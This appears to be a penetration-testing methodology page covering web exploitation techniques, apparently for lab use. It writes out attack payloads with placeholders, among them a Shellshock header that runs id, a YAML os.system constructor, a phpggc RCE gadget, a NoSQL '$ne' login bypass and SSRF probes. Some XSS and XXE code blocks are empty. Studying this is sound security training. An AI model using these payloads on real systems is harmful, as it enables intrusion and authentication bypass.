Commands and use-case variants > **Need:** A reproducible application request and a controlled input or access-context comparison. Payload reaches a browser execution sink; any useful privileged action additionally needs a victim context, same-origin access and a valid request state First inject a unique text marker and inspect where it appears in raw HTML and the DOM. Then use a controlled proof appropriate to the context: ```html ``` Classify the path: - reflected: victim must visit a crafted request; - stored: payload persists and a relevant user later renders it; - DOM-based: client-side code moves controlled data into an executable DOM sink. > **Decisive output:** JavaScript executes under the expected application origin and viewer context. Reflection or HTML display alone is not XSS. Match the proof to the observed parser context rather than trying a random payload list: | Observed insertion context | Minimal lab proof candidate | What failure means | | --- | --- | --- | | HTML element body | `
Find: Use WordPress component evidence and authorized administration features Confirm WordPress-specific routes/components and inspect the capabilities actually presented after an accepted application login. ```bash curl -sk -i http://TARGET:PORT/wp-login.php ``` > **Recognize:** Product/component and role clues guide two different paths: exact component exploit matching or a permitted administrative feature. > **Validate next:** Verify build/configuration for a CVE, or actual editor/plugin/file rights plus executable handling for a feature chain. [Use WordPress component evidence and authorized administration features](../notes/methods/web-exploitation.md#web-cms).
Commands and use-case variants > **Need:** A reproducible application request and a controlled input or access-context comparison. Exact component/version or a verified role; file-edit/plugin installation rights and runtime write/execution must be checked > **Recognition:** WordPress-specific paths/assets, generator metadata, REST routes or `wp-content`. **Prerequisite:** correct scheme, host header and base path. **Decisive output:** core/plugin/theme identity or an authenticated capability that maps to a concrete prerequisite. ```bash curl -skI https://HOSTNAME/ curl -sk https://HOSTNAME/robots.txt curl -sk https://HOSTNAME/wp-json/ | head curl -sk https://HOSTNAME/wp-content/ curl -sk https://HOSTNAME/wp-login.php -o wp-login.html ``` Inspect page source for `/wp-content/plugins/NAME/`, `/wp-content/themes/NAME/`, versioned assets and alternate base paths. A visible version is a candidate, not exploitability proof.
WPScan inventory ```bash wpscan --url https://HOSTNAME/ --disable-tls-checks \ --enumerate vp,vt,u --plugins-detection mixed \ --output wpscan-HOSTNAME.txt ``` > WPScan can be useful for component/user candidates, but verify every useful result manually. Vulnerability-database details may require an API token; never place a token in published notes or command history.
Validate one legitimately acquired credential and then enumerate the role/capabilities it actually grants. ```bash curl -sk -c wp.cookies -b wp.cookies \ --data-urlencode 'log=USER' \ --data-urlencode 'pwd=PASSWORD' \ --data-urlencode 'wp-submit=Log In' \ --data-urlencode 'redirect_to=https://HOSTNAME/wp-admin/' \ https://HOSTNAME/wp-login.php -D wp-login.headers curl -sk -b wp.cookies https://HOSTNAME/wp-admin/ -o wp-admin.html ``` > A redirect alone is inconclusive. Confirm an authenticated page marker and the actual role. Useful capabilities can include media upload, plugin/theme editing/installation, post editing or administrative account management; each requires separate server-side authorization and execution conditions. XML-RPC exposure is a feature clue, not automatically a vulnerability: ```bash curl -sk -X POST https://HOSTNAME/xmlrpc.php \ -H 'Content-Type: text/xml' \ --data 'system.listMethods' ``` > **Verify:** Verify application role and any produced execution identity; component names alone do not establish a vulnerable version. > **If it fails:** Missing editor, insufficient role or read-only filesystem changes the branch. Use exact exploit prerequisite matching or credential reuse.
Find: Use server-side requests to inspect reachable internal behavior Browse legitimate import/preview/webhook functions and identify a request whose normal input is a server-fetched URL. ```bash curl -skG --data-urlencode 'url=http://LHOST:PORT/FETCH_CANARY' http://TARGET:PORT/FETCH_PATH ``` > **Recognize:** A correlated receiver event supports server-side fetching; it does not establish internal access or response-readable SSRF. > **Validate next:** Separate client-side fetches, server source, destination/protocol restrictions and response visibility. [Use server-side requests to inspect reachable internal behavior](../notes/methods/web-exploitation.md#web-ssrf).
Commands and use-case variants > **Need:** A reproducible application request and a controlled input or access-context comparison. The application server performs a controllable request; destination/protocol policy and its network position permit the selected resource > **Recognition:** URL import, webhook, image/PDF fetch, feed preview, link unfurling or callback validation. **Prerequisite:** a parameter that the server dereferences. **Decisive output:** a request observed at a controlled listener or a stable response difference tied to the destination. Listener: ```bash python3 -m http.server LPORT --bind 0.0.0.0 ``` Hypothetical request replay: ```bash curl -sk 'https://HOSTNAME/fetch?url=http://LHOST:LPORT/ssrf-marker' ``` Interpret the path explicitly: ```text browser/client -> vulnerable application -> requested URL ``` The application, not Kali, must resolve and reach the destination. A browser-side fetch, open redirect or reflected URL does not prove SSRF.
Internal destination and parser variations ```bash # Only after an external controlled callback proves server-side fetching curl -sk 'https://HOSTNAME/fetch?url=http://127.0.0.1:PORT/' curl -sk 'https://HOSTNAME/fetch?url=http://localhost:PORT/' # Preserve encoding when the URL is nested in form data curl -sk -X POST https://HOSTNAME/fetch \ --data-urlencode 'url=http://127.0.0.1:PORT/' ``` > Compare status, body marker, size and timing against a closed-port control. Internal HTTP content establishes reachability/read capability, not command execution.
> **Verify:** Verify source/request evidence and the exact returned internal behavior; separate blind fetches from response-readable SSRF. > **If it fails:** No callback may be DNS, URL validation, egress or application behavior. Test the first failed boundary and avoid indiscriminate destination guessing.
Find: Prove server-side template evaluation and identify its engine Inspect mapped previews, reports and server-rendered inputs for template syntax clues; preserve the normal request and literal control. ```bash curl -sS -G --data-urlencode 'name={{7*7}}' http://TARGET:PORT/PATH ``` > **Recognize:** A repeatable computed result supports evaluation in that syntax but does not identify the engine or command capability. > **Validate next:** Correlate error/source/framework clues and test a discriminating engine expression before selecting objects. [Prove server-side template evaluation and identify its engine](../notes/methods/web-exploitation.md#web-ssti).
Commands and use-case variants > **Need:** A reproducible application request and a controlled input or access-context comparison. The application evaluates attacker-controlled template syntax and the selected engine exposes a useful object or function Use when controlled text appears inside a server-rendered template, email preview or report. Replay the real parameter and session. These are separate probes, not one universal payload: ```bash # Jinja/Twig-style expression probe curl -sS -G --data-urlencode 'name={{7*7}}' http://TARGET:PORT/PATH # A different delimiter family, only when the first is literal or errors suggest it curl -sS -G --data-urlencode 'name=${7*7}' http://TARGET:PORT/PATH # Jinja-versus-Twig clue; interpret alongside source/errors, not in isolation curl -sS -G --data-urlencode "name={{7*'7'}}" http://TARGET:PORT/PATH ``` Read: changed, repeatable computed output compared with a literal control supports evaluation. `49` alone does not identify the engine. Jinja commonly repeats the string; Twig commonly treats it numerically. Confirm the engine/version and exposed objects before selecting a file-read or command primitive. Literal reflection → inspect another template/input boundary; a syntax error alone does not prove an exploitable expression. Sources: [upstream 1](https://portswigger.net/web-security/server-side-template-injection). > **Verify:** Require repeatable computed output and corroborating engine clues; the value 49 alone does not identify the engine. > **If it fails:** Literal output rejects that syntax in the tested sink; a syntax error can be a parser clue but is not exploitation proof.
Find: Use an XML parser's external-entity behavior for bounded file read Start from a valid XML request and place an external-entity reference in a field whose parsed value is returned. ```bash curl -i -b cookies.txt -H 'Content-Type: application/xml' --data-binary @xxe.xml http://TARGET:PORT/PATH ``` > **Recognize:** The server parser resolved the entity and read the selected file under its process identity. > **Validate next:** Repeat with a benign control and preserve the exact parser/content-type context. [Use an XML parser's external-entity behavior for bounded file read](../notes/methods/web-exploitation.md#web-xxe).
Commands and use-case variants > **Need:** A reproducible application request and a controlled input or access-context comparison. External entity or XInclude processing is enabled and the parser identity can read the selected file Use a working XML request and put the entity reference in a field whose parsed value is returned. Retain the original wrapper, cookies and endpoint. Example body for an XML-compatible endpoint: ```xml ]> &probe; ``` ```bash curl -i -b cookies.txt -H 'Content-Type: application/xml' \ --data-binary @xxe.xml http://TARGET:PORT/PATH ``` Read: recognizable file content in the parsed field proves read access; echoing the submitted XML does not. Choose a platform-appropriate file; Windows can use `file:///C:/Windows/win.ini`. DTD rejection or unresolved entities → check the parser's actual configuration, not more traversal depth. If the application builds XML around your input and processes XInclude, a separate condition can exist without control over the document's DOCTYPE: ```xml ``` A blind endpoint needs an observable parser/network effect before any exfiltration claim. Follow verified config/source reads into credential or application testing. Sources: [upstream 1](https://portswigger.net/web-security/xxe). > **Verify:** Require recognizable file content or a uniquely correlated parser-side event, not an echoed request. > **If it fails:** DTD rejection, unresolved entities or no network effect rules out only that parser/configuration route; preserve the working XML baseline.
Find: Test structured NoSQL operator injection with identity controls Capture the real JSON or nested-form login/search request and compare a wrong scalar, operator object and operator-as-string. ```bash curl -i -c cookies.txt -H 'Content-Type: application/json' --data '{"username":"USER","password":{"$ne":""}}' http://TARGET:PORT/LOGIN ``` > **Recognize:** A structured operator changed the query and produced an authenticated state for the named identity. > **Validate next:** Verify protected access and identity; ensure the framework parsed an object rather than a string. [Test structured NoSQL operator injection with identity controls](../notes/methods/web-exploitation.md#web-nosql).
Commands and use-case variants > **Need:** A reproducible application request and a controlled input or access-context comparison. The framework preserves an attacker-controlled operator object and the query uses it without rejecting its type Use when a login/search accepts structured JSON or nested form parameters and evidence suggests a MongoDB-style query. Start with a normal failed request, then change one value's type. ```bash # A known username with an operator-valued password curl -i -c cookies.txt -H 'Content-Type: application/json' \ --data '{"username":"USER","password":{"$ne":""}}' http://TARGET:PORT/LOGIN # Distinct context: a form parser that expands bracketed properties curl -i -c cookies.txt --data-urlencode 'username=USER' \ --data-urlencode 'password[$ne]=x' http://TARGET:PORT/LOGIN ``` Read: compare against the same operator encoded as a plain string and against a known wrong password. Confirm the resulting identity through a protected route. A 200/login page or changed error is not authenticated access. Type validation, hashing the supplied password before querying, or removal of `$` operators can rule out this route. Broader `$ne` username queries may select an unexpected first account; keep the intended identity explicit. Sources: [upstream 1](https://portswigger.net/web-security/nosql-injection). > **Verify:** Verify a protected action and resulting identity; a 200 status or cookie alone is not authentication. > **If it fails:** Schema/type validation, password pre-hashing or operator filtering can reject the route; do not broaden to an unintended first account.
Find: Match PHP deserialization gadgets to installed dependencies Use source, composer metadata and request format to establish unsafe PHP deserialization and loaded gadget classes before generating bytes. ```bash phpggc -l phpggc -i Monolog/RCE1 ``` > **Recognize:** The sink and loaded class family supply a gadget-chain candidate; generation alone is not execution. > **Validate next:** Match exact version/vector, preserve serialized lengths/encoding and verify one benign effect. [Match PHP deserialization gadgets to installed dependencies](../notes/methods/web-exploitation.md#web-php-deserialization).
Commands and use-case variants > **Need:** A reproducible application request and a controlled input or access-context comparison. Required gadget classes and compatible dependency versions are loaded; transport preserves exact serialized bytes Use when a controlled serialized value reaches unsafe `unserialize()` and the required classes are loaded. Identify dependencies/builds from source or `composer.lock` first. ```bash # Inspect available families and the exact chain's version/vector requirements phpggc -l phpggc -i Monolog/RCE1 # Example function-call gadget, only when that chain matches the application phpggc -b Monolog/RCE1 system id > payload.b64 ``` Read: base64 is a transport choice, not a bypass—the sink must decode it before deserialization. Preserve raw serialized lengths and binary bytes; use the encoding that the real request expects. A generated payload is not execution proof. Missing classes, rejected object types or a different dependency version → choose a matching chain or another primitive. Verify a benign effect before selecting a shell payload. Sources: [upstream 1](https://github.com/ambionics/phpggc). > **Verify:** Require the exact dependency/version, sink and attributable effect; successful payload generation proves none of these. > **If it fails:** Missing classes, allowed-class restrictions, length corruption or version mismatch defeats the chain; choose only an evidence-matched family.
Find: Validate unsafe YAML object construction Inspect source/errors for the actual Python YAML loader before placing a constructor in the application's required schema. ```yaml !!python/object/apply:os.system ["id"] ``` > **Recognize:** The application constructed the selected Python object under an unsafe loader. > **Validate next:** Confirm loader/version and an attributable effect in the real import/request path. [Validate unsafe YAML object construction](../notes/methods/web-exploitation.md#web-yaml).
Find: Test Shellshock only through a confirmed CGI-to-Bash chain Confirm a CGI endpoint, Bash invocation and vulnerable component evidence before sending one bounded header probe. ```bash curl -i -H 'User-Agent: () { :;}; echo; /usr/bin/id' http://TARGET:PORT/cgi-bin/SCRIPT ``` > **Recognize:** Command-derived identity output supports Shellshock execution under the CGI process. > **Validate next:** Separate command output from reflected header text and record the exact script/Bash context. [Test Shellshock only through a confirmed CGI-to-Bash chain](../notes/methods/web-exploitation.md#web-shellshock).
Commands and use-case variants > **Need:** A reproducible application request and a controlled input or access-context comparison. HTTP-derived environment data reaches an affected Bash process and the selected command is available Use when a confirmed CGI endpoint passes HTTP-derived environment variables into an affected Bash process. An arbitrary PHP/Java route or a Bash version string alone does not establish this chain. ```bash # Bounded command-effect probe at the actual CGI script curl -i -H 'User-Agent: () { :;}; echo; /usr/bin/id' \ http://TARGET:PORT/cgi-bin/SCRIPT ``` Read: an attributable UID in the executed CGI response supports the effect; reflection of the header text does not. Header/CGI parsing errors require inspecting the request and script behavior. No effect → re-check the actual component and patch status before selecting another PoC. This is the CVE-2014-6271 family, not a generic command separator for every web input. Sources: [upstream 1](https://nvd.nist.gov/vuln/detail/CVE-2014-6271). > **Verify:** Require command-derived output distinct from reflected header text and record the CGI identity. > **If it fails:** No effect can mean patched Bash, non-Bash CGI, header sanitization or wrong endpoint; re-check the component before another payload.
Find: Conditional: validate an out-of-band SQL request channel After DBMS/query influence is established, document the absence of stable in-band channels and inspect whether the database platform exposes a permitted outbound lookup facility. ```bash curl -sk -D - --get --data-urlencode 'PARAM=BASELINE_VALUE' http://TARGET:PORT/PATH ``` > **Recognize:** Lack of an in-band channel motivates investigation but does not prove an outbound channel exists. > **Validate next:** Confirm the exact function, database/OS rights, allowed egress and a uniquely correlated controlled receiver event. [Conditional: validate an out-of-band SQL request channel](../notes/methods/web-exploitation.md#sql-oob).
